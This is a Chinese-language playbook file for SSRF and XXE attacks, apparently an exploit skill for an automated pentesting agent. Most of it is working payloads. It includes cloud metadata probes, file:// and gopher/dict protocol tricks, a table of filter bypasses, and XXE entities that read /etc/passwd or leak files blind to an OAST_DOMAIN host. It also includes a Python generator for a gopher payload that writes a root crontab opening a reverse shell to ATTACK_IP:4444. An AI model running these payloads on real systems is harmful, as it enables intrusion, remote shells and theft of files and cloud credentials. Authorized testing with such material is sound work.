---
name: ssrf-xxe
description: SSRF 与 XXE 的探测、协议利用、云元数据读取与带外确认；含 interactsh 用法与常见 bypass 表
whenToUse: 参数接受 URL / 文件路径 / XML 实体，或发现图片抓取、webhook、PDF 生成、导入功能
role: exploit
enabled: true
---

# SSRF / XXE

## SSRF 判据三连

```bash
# 1. 回环与端口探测
url=http://127.0.0.1:PORT
url=http://127.0.0.1:22
# 2. 元数据（云上才有）
url=http://169.254.169.254/latest/meta-data/
url=http://metadata.google.internal/computeMetadata/v1/  (加 Header: Metadata-Flavor: Google)
# 3. 带外
url=http://OAST_DOMAIN/probe
```

响应差异只能算 `suspected`，**必须有 OAST 回连**才算实锤。

## 协议速查

```
file:///etc/passwd              file:///c:/windows/win.ini
gopher://127.0.0.1:6379/_INFO   （Redis 未授权 → 写 crontab/webshell）
dict://127.0.0.1:11211/stat     （Memcached）
http://[::1]:80/                 IPv6 绕 localhost 过滤
http://0/  http://0x7f000001/   数字/十六进制绕
```

## Bypass 表

| 过滤 | 绕法 |
|---|---|
| 只允许 http(s) | 302 跳转（自己服务器）、gopher 用 curl 手工发 |
| 黑名单 127.0.0.1 | `127.1` `0.0.0.0` `[::1]` `2130706433` `0x7f000001` |
| 只校验前缀 | `http://allowed.com@evil.com` |
| 只解析一次 DNS | DNS rebinding（自建 TTL=0 记录） |
| 禁内网段 | 十进制/八进制/IPv6 映射 `::ffff:127.0.0.1` |

## Redis 经 gopher 打 shell

```bash
# 生成 payload（改 IP/PORT/PATH）
python - <<'PY'
import urllib.parse
cmd = "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1\n\n"
payload = ("\r\n".join([
  "flushall",
  "set 1 \"" + cmd + "\"",
  "config set dir /var/spool/cron/",
  "config set dbfilename root",
  "save",
]) + "\r\n")
print("gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload))
PY
```

## XXE

```xml
<!-- 读文件 -->
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>

<!-- 带外 -->
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://OAST_DOMAIN/x.dtd"> %p;]>

<!-- 盲 XXE 外带文件 -->
<!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % d "<!ENTITY &#37; o SYSTEM 'http://OAST_DOMAIN/?%f;'>"> %d; %o;]>
```

老解析器不认 SYSTEM 时试 `data:` 与 `php://filter`（PHP 环境读源码）：

```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

## 判据

- SSRF：OAST 有回连才算 true；仅"响应变慢/报错不同"记 suspected
- XXE：文件内容真实回显，或 OAST 收到含内容的请求
- 落库写清入口参数、payload 原文、回连时间戳、读到的前 200 字节
